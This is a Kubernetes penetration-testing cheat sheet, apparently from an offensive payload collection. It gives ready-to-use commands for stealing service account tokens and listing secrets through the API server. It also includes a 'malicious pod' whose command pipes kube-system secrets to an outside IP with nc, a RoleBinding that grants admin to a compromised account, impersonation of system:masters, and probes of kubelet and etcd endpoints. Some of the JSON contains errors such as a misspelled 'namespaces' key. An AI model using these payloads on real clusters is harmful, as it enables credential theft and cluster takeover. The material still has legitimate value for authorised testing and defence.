# Kubernetes

> Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.

## Summary 

- [Tools](#tools)
- [RBAC Configuration](#rbac-configuration)
    - [Listing Secrets](#listing-secrets)
    - [Access Any Resource or Verb](#access-any-resource-or-verb)
    - [Pod Creation](#pod-creation)
    - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
    - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
- [Privileged Service Account Token](#privileged-service-account-token)
- [Interesting endpoints to reach](#interesting-endpoints-to-reach)
- [API addresses that you should know](#api-addresses-that-you-should-know)
- [References](#references)

## Tools

* [kubeaudit](https://github.com/Shopify/kubeaudit) - Audit Kubernetes clusters against common security concerns
* [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources
* [kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)
* [kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters 
* [katacoda](https://katacoda.com/courses/kubernetes) - Learn Kubernetes using interactive broser-based scenarios

## Service Token

> As it turns out, when pods (a Kubernetes abstraction for a group of containers) are created they are automatically assigned the default service account, and a new volume is created containing the token for accessing the Kubernetes API. That volume is then mounted into all the containers in the pod.

```powershell
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token

# kubectl makes cluster compromise trivial as it will use that serviceaccount token without additional prompting
```

## RBAC Configuration

### Listing Secrets

An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in "kube-system" namespace.

```powershell
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Access Any Resource or Verb

```powershell
resources:
- '*'
verbs:
- '*'
```

### Pod Creation

Check your right with `kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml`.
Then create a malicious pod.yaml file.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

Then `kubectl apply -f malicious-pod.yaml`

### Privilege to Use Pods/Exec

```powershell
kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh
```

### Privilege to Get/Patch Rolebindings

The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account. 
Create a malicious RoleBinging.json file.

```powershell
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespcaes": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp"
            "namespace": "default"
        }
    ]
}
```

```powershell
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

### Impersonating a Privileged Account

```powershell
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

## Privileged Service Account Token

```powershell
$ cat /run/secrets/kubernetes.io/serviceaccount/token
$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
```

## Interesting endpoints to reach

```powershell
# List Pods
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/pods/

# List secrets
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/

# List deployments
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments

# List daemonsets
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
```


## API addresses that you should know 

*(External network visibility)*

### cAdvisor

```powershell
curl -k https://<IP Address>:4194
```

### Insecure API server

```powershell
curl -k https://<IP Address>:8080
```

### Secure API Server

```powershell
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```

### etcd API

```powershell
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

### Kubelet API

```powershell
curl -k https://<IP address>:10250
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```

### kubelet (Read only)

```powershell
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```


## References

- [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://securityboulevard.com/2019/08/kubernetes-pentest-methodology-part-1)
- [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://securityboulevard.com/2019/09/kubernetes-pentest-methodology-part-2)
- [Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019](https://securityboulevard.com/2019/11/kubernetes-pentest-methodology-part-3)
- [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
